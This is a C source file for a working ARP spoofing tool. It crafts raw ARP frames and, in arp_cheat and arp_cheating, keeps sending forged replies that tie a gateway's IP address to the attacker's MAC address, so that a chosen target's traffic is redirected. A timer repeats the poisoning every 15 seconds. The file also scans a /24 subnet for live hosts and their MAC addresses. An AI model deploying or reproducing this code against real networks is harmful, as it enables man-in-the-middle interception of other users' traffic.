#include "socket_arp.h"
#include <timer.h>

/*************************************************************
**********  Function Declaration Of ARP Cheating  ************
**************************************************************/
/**
 * @brief arp_request_package 
 *
 * @param frame
 * @param src_ip[4]
 * @param src_mac[6]
 * @param dst_ip[4]
 */
void arp_request_package(struct frame_arp *frame, unsigned char src_ip[4], 
                    unsigned char src_mac[6], unsigned char dst_ip[4])
{
    unsigned char broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    memcpy(frame->fh.dst_mac, broad_mac, 6);
    memcpy(frame->fh.src_mac, src_mac, 6);
    frame->fh.proto_type = htons(ETH_P_ARP);
    frame->ah.ar_hrd = htons(ARPHRD_ETHER);
    frame->ah.ar_pro = htons(ETH_P_IP);
    frame->ah.ar_hln = 6;
    frame->ah.ar_pln = 4;
    frame->ah.ar_op = htons(ARPOP_REQUEST);
    memcpy(frame->src_mac, src_mac, 6);
    memcpy(frame->src_ip, src_ip, 4);
    //memset(frame->dst_mac, 0, 6);
    memcpy(frame->dst_ip, dst_ip, 4); 
}

/**
 * @brief arp_reply_package 
 *
 * @param frame
 * @param src_ip[4]
 * @param src_mac[6]
 * @param dst_ip[4]
 * @param dst_mac[6]
 */
void arp_reply_package(struct frame_arp *frame, unsigned char src_ip[4], 
                    unsigned char src_mac[6], unsigned char dst_ip[4], unsigned char dst_mac[6])
{  
    memcpy(frame->fh.dst_mac, dst_mac, 6);
    memcpy(frame->fh.src_mac, src_mac, 6);
    frame->fh.proto_type = htons(ETH_P_ARP);
    frame->ah.ar_hrd = htons(ARPHRD_ETHER);
    frame->ah.ar_pro = htons(ETH_P_IP);
    frame->ah.ar_hln = 6;
    frame->ah.ar_pln = 4;
    frame->ah.ar_op = htons(ARPOP_REPLY);
    memcpy(frame->src_mac, src_mac, 6);
    memcpy(frame->src_ip, src_ip, 4);
    memcpy(frame->dst_mac, dst_mac, 6);
    memcpy(frame->dst_ip, dst_ip, 4); 
}

/**
 * @brief arp_request_send 
 *
 * @param fd
 * @param addr
 * @param dst_ip[4]
 * @param src_ip[4]
 * @param src_mac[6]
 *
 * @return send count, if succ; -1, if failed 
 */
int arp_request_send(int fd, struct sockaddr *addr, unsigned char dst_ip[4], 
             unsigned char src_ip[4], unsigned char src_mac[6])
{
    struct frame_arp frame;
    
    memset(&frame, 0, sizeof(frame));
    arp_request_package(&frame, src_ip, src_mac, dst_ip);
    sendto(fd, &frame, sizeof(frame), 0, addr, sizeof(struct sockaddr_ll));
    
    return fd;
}

/**
 * @brief arp_reply_send 
 *
 * @param fd
 * @param addr
 * @param dst_ip[4]
 * @param dst_mac[6]
 * @param src_ip[4]
 * @param src_mac[6]
 *
 * @return send count, if succ; -1, if failed 
 */
int arp_reply_send(int fd, struct sockaddr *addr, unsigned char dst_ip[4], unsigned char dst_mac[6], 
             unsigned char src_ip[4], unsigned char src_mac[6])
{
    struct frame_arp frame;
    int rt = 0;
    
    memset(&frame, 0, sizeof(frame));
    arp_reply_package(&frame, src_ip, src_mac, dst_ip, dst_mac);
    rt = sendto(fd, &frame, sizeof(frame), 0, addr, sizeof(struct sockaddr_ll));
    
    return rt;
}

static void callback(unsigned char *arg, const struct pcap_pkthdr *head, 
        const unsigned char *packet)
{
    struct frame_arp *old_frame = (struct frame_arp *)packet;
    struct frame_arp frame;
	struct pcap_info *info = (struct pcap_info *)arg;
    int ar_op = -1;
    char ip_buf[128] = {0};

    memcpy(&frame, packet, sizeof(frame));
    ar_op = ntohs(frame.ah.ar_op);

    // ------------------------------------arp frame info-------------------------------------------------------
    if(ar_op == 1) printf("arp request\t");
    if(ar_op == 2) printf("arp reply \t");
    inet_ntop(AF_INET, &old_frame->src_ip, ip_buf, sizeof(ip_buf));
    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->src_mac[0],old_frame->src_mac[1],old_frame->src_mac[2],
            old_frame->src_mac[3],old_frame->src_mac[4],old_frame->src_mac[5], ip_buf);
    printf("\t->\t");
    memset(ip_buf, 0, sizeof(ip_buf));
    inet_ntop(AF_INET, &old_frame->dst_ip, ip_buf, sizeof(ip_buf));
    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->dst_mac[0], old_frame->dst_mac[1], 
            old_frame->dst_mac[2], old_frame->dst_mac[3], old_frame->dst_mac[4], 
            old_frame->dst_mac[5], ip_buf);
    printf("\n");

    // ---------------------------------------------------------------------------------------------
    if(ar_op == ARPOP_REPLY && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->local_ip[3]) {
        //send faked arp reply frame
        arp_reply_send(info->fd, (struct sockaddr*)&info->addr, info->attack_ip, old_frame->src_mac, 
                        info->gateway_ip, info->local_mac);
        printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
                (old_frame->src_ip)[0], (old_frame->src_ip)[1],
                (old_frame->src_ip)[2], (old_frame->src_ip)[3]);
    }

    if((ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->gateway_ip[3]) ||
            (ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->gateway_ip[3]))
    {
        sleep(1);
        arp_request_send(info->fd, (struct sockaddr *)&info->addr, info->attack_ip, info->local_ip, info->local_mac);
        printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info->attack_ip[0], 
            info->attack_ip[1], info->attack_ip[2], info->attack_ip[3]);
    }

}

/**
 * @brief pcap_listen 
 *
 * @param arg
 *
 * @return 
 */
void* pcap_listen(void *arg)
{
    char errbuf[1024] = {0};
    unsigned int net, mask;
    struct bpf_program fp;
    
    if (arg == NULL) return NULL;
    pcap_t *handle = pcap_open_live(((struct pcap_info *)arg)->ifname, 
            2048, 1, 1000, errbuf);
    if(handle == NULL) {
		printf("pcap_open_live():%s\n", errbuf);
		exit(1);
	}
	
    if(pcap_lookupnet(((struct pcap_info *)arg)->ifname, &net, &mask, errbuf) == -1) 
        printf("pcap_lookupnet():%s\n", errbuf);
    if(pcap_compile(handle, &fp, ((struct pcap_info *)arg)->proto, 0, net) == -1) 
        printf("pcap_compile():%s\n", errbuf);
    if(pcap_setfilter(handle, &fp) == -1) 
        printf("pcap_setfilter():%s\n", errbuf);
    while(pcap_loop(handle, -1, ((struct pcap_info *)arg)->cb, arg) != -1);

    return NULL;
}

void timer_to_arp_send(void *arg)
{
    struct pcap_info *info = (struct pcap_info *)arg;
    arp_request_send(info->fd, (struct sockaddr *)&info->addr, info->attack_ip, info->local_ip, info->local_mac);
    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info->attack_ip[0], 
            info->attack_ip[1], info->attack_ip[2], info->attack_ip[3]);
}

/**
 * @brief arp_cheat 
 *
 * @param ifname     [in] interface name
 * @param attack_ip  [in] ip address of attacking
 * @param gateway_ip [in] ip address of gateway
 *
 * @return 0, if succ; -1, if failed
 */
int arp_cheat(const char *iifname, const char *iattack_ip, 
        const char *igateway_ip)
{
    pthread_t pid; 
    struct ifreq req;
    struct pcap_info info = {0};
    struct timer *tm = NULL;
    char ip[20] = {0};
    char ifname[64] = {0};
    char gateway[20] = {0};
    char *ifname_save = (char *)iifname;
    char *gw_save = gateway;

    /**
     * check ifname
     */
    if (iattack_ip == NULL) return -1;
    if (iifname ==  NULL || !strlen(iifname)) {
        get_ifname(ifname);
        ifname_save = strtok(ifname, " ");
    }
    if (ifname_save == NULL) return -1;

    /**
     * check gateway
     */
    if (igateway_ip == NULL || !strlen(igateway_ip)) {
        get_gateway(gw_save, ifname_save);
    }
    if (!strlen(gw_save)) return -1;
    if (!inet_aton(gw_save, &info.addr.in_addr)) {
        fprintf(stderr, "invalid gateway address %s\n", gw_save);
        exit(1);
    }

    if ((info.fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket()");
        exit(1);
    }

    info.addr.addr_ll.sll_family = AF_PACKET;
    memset(&req, 0, sizeof(req));
    strcpy(req.ifr_name, ifname_save);
    xioctl(info.fd, SIOCGIFINDEX, (char *)&req, "ioctl() SIOCGIFINDEX");
    /*if (ioctl(info.fd, SIOCGIFINDEX, &req) != 0) {
        perror("ioctl()");
        exit(1);
    }*/
    info.addr.addr_ll.sll_ifindex = req.ifr_ifindex;
    info.addr.addr_ll.sll_protocol = htons(ETH_P_ARP);
    
    /**
     * check etherface ARPable
     */
    //ioctl(info.fd, SIOCGIFFLAGS, (char *)&req);
    xioctl(info.fd, SIOCGIFFLAGS, (char *)&req, "ioctl() SIOCGIFFLAGS");
    if (!(req.ifr_flags & IFF_UP)) {
        fprintf(stderr, "%s is down\n", iifname);
        exit(1);
    }
    if (req.ifr_flags & (IFF_NOARP | IFF_LOOPBACK)) {
        fprintf(stderr, "%s is not ARPable\n", iifname);
        exit(1);
    }
    /**
     * packet pcap_info
     */
    info.proto = "arp";
    strcpy(info.ifname, ifname_save);
    info.cb = callback;
    ip2arr(iattack_ip, info.attack_ip);
    ip2arr(gw_save, info.gateway_ip);
    get_ip_by_ifname(ifname_save, ip);
    ip2arr(ip, info.local_ip);
    get_mac_addr(ifname_save , info.local_mac);
	
    pthread_create(&pid, NULL, pcap_listen, &info);
    arp_request_send(info.fd, (struct sockaddr *)&info.addr, info.attack_ip, info.local_ip, info.local_mac);
    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", info.attack_ip[0], 
            info.attack_ip[1], info.attack_ip[2], info.attack_ip[3]);
    tm = timer_creat(15 * 1000, timer_to_arp_send, (void *)&info, 1);
    timer_start(tm);
    pthread_exit(NULL);

    return 0;
}


/**
 * @brief get_net_mac 
 *
 * @param ip     [in]  target ip address
 *
 * @return 0, if uscc; -1, if failed
 */
int arp_cheating(char *dstip)
{
    int fd, len;
    struct sockaddr addr;
    struct frame_arp recv_buf;
    char ifname[10] = {0};
    unsigned char src_mac[6];
    unsigned char src_ip[6];
    unsigned char dst_ip[6];
    unsigned char gw_ip[6];
    char src_ip_buf[20] = {0};
    char gw_ip_buf[20] = {0};
    char ip_buf[20] = {0};
    struct timeval tv = {0};
    fd_set set;
    int ar_op = 0;

    if (dstip == NULL) return -1;

    /**
     * local info
     */
    get_gateway(gw_ip_buf, ifname);
    get_ip_by_ifname(ifname, src_ip_buf);
    get_mac_addr(ifname, src_mac);
    ip2arr(gw_ip_buf, gw_ip);
    ip2arr(src_ip_buf, src_ip);
    ip2arr(dstip, dst_ip);

    /**
     * init addr
     */
    memset(&addr, 0, sizeof(addr));
    addr.sa_family = PF_PACKET;
    strcpy(addr.sa_data, ifname);

    /**
     * create socket
     */
    if ((fd = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        perror("socket()");
        exit(1);
    }

    /**
     * bind socket
     */
    if (bind(fd, &addr, sizeof(addr)) < 0) {
        perror("bind()");
        exit(1);
    }

    /**
     * init arp request packet
     */
    len = sizeof(struct sockaddr);
    arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
            dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);

    FD_ZERO(&set);
    FD_SET(fd, &set);
    while (1) {
        tv.tv_sec = 0;
        tv.tv_usec = 1000 * 100;
        FD_ZERO(&set);
        FD_SET(fd, &set);

        select(fd + 1, &set, NULL, NULL, &tv);
        if (FD_ISSET(fd, &set))
        {
            recvfrom(fd, &recv_buf, sizeof(recv_buf), 0, NULL, NULL);
            if (ntohs(recv_buf.fh.proto_type) != 0x0806) continue;
            ar_op = ntohs(recv_buf.ah.ar_op);

            // ------------------------------------arp frame info-------------------------------------------------------
            if(ar_op == 1) printf("arp request\t");
            if(ar_op == 2) printf("arp reply \t");
            inet_ntop(AF_INET, &recv_buf.src_ip, ip_buf, sizeof(ip_buf));
            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.src_mac[0],recv_buf.src_mac[1],recv_buf.src_mac[2],
                    recv_buf.src_mac[3],recv_buf.src_mac[4],recv_buf.src_mac[5], ip_buf);
            printf("\t->\t");
            memset(ip_buf, 0, sizeof(ip_buf));
            inet_ntop(AF_INET, &recv_buf.dst_ip, ip_buf, sizeof(ip_buf));
            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.dst_mac[0], recv_buf.dst_mac[1], 
                    recv_buf.dst_mac[2], recv_buf.dst_mac[3], recv_buf.dst_mac[4], 
                    recv_buf.dst_mac[5], ip_buf);
            printf("\n");

            if (memcmp(recv_buf.src_ip, dst_ip, 4)) {
                arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
                printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
                        dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
                continue;
            }
            if (ar_op == ARPOP_REQUEST)
            {
                if (!memcmp(recv_buf.src_ip, gw_ip, 4) || 
                    (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
                    !memcmp(recv_buf.dst_ip, gw_ip, 4))) 
                {
                    printf("request\n");
                    sleep(1);
                    arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
                    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
                            dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
                }
            } else if (ar_op == ARPOP_REPLY) {
                if (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
                    !memcmp(recv_buf.dst_ip, src_ip, 4)) 
                {
                    arp_reply_send(fd, &addr, dst_ip, recv_buf.src_mac, gw_ip, src_mac);
                    printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
                            (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
                            (recv_buf.src_ip)[2], (recv_buf.src_ip)[3]);
                }
            }
        }
    }
    
    return 0;
}

static int scan_cnt = 0;
pthread_mutex_t mtx;
static void* get_mac(void *arg)
{
    unsigned char mac[6] = {0};
    int tm = 0;
    char ip[20] = {0};
    char str_mac[20] = {0};
    int len = 0;

    if (arg == NULL) return NULL;
    strcpy(ip, (char *)arg);
    len = strlen(ip);
    tm = get_net_mac(ip, mac, 5);
    if (tm > 0) {
        arr2mac(mac, str_mac);
        printf("Host %s", ip);
        len = 16 - len;
        while (len-- >= 0) printf(" ");
        printf("[%s] is up, used %d.%03ds.\n", str_mac, 
                tm / 1000000, tm % 1000000);
        pthread_mutex_lock(&mtx);
        scan_cnt++;
        pthread_mutex_unlock(&mtx);
    }

    return NULL;
}

/**
 * @brief router_info 
 */
void router_info()
{
    pthread_t pt[255];
    int i = 0;
    char ip[20] = {0};

    pthread_mutex_init(&mtx, NULL);
    for (i = 1; i <= 255; i++)
    {

        sprintf(ip, "192.168.1.%d", i);
        pthread_create(&pt[i - 1], NULL, get_mac, (void *)ip);
        usleep(700);
    }
    pthread_exit(NULL);

    return;
}
